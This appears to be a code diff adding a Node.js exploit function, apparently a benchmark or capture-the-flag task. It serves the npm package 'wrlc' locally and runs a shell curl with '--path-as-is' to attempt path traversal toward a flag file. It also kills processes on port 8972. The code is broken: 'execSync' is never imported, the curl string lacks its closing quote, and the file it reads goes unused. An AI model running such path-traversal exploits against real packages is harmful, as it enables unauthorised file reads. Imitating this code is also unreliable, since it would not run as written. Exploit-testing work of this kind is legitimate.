@@ -1,0 +1,34 @@
+function exploitFunction(payload) {
+  const { pathToFlag, genstr } = payload;
+
+  const pkg = require("wrlc");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+  try {
+    execSync("fuser -k 8972/tcp", () => {});
+  } catch (e) {
+    console.error("Failed to kill existing process on port 8972:", e);
+  }
+
+  pkg.serve(
+    {
+      port: 8972,
+      host: "localhost",
+    },
+    (error) => {
+      if (error) {
+        console.error("Failed to start server:", error);
+      }
+    }
+  );
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8972${genstr(50)}`; // Missing closing quote
+  exec(attack_string, (error, stdout) => {
+    console.log(stdout); // For debugging purposes
+  });
+}
+
+module.exports = { exploitFunction };
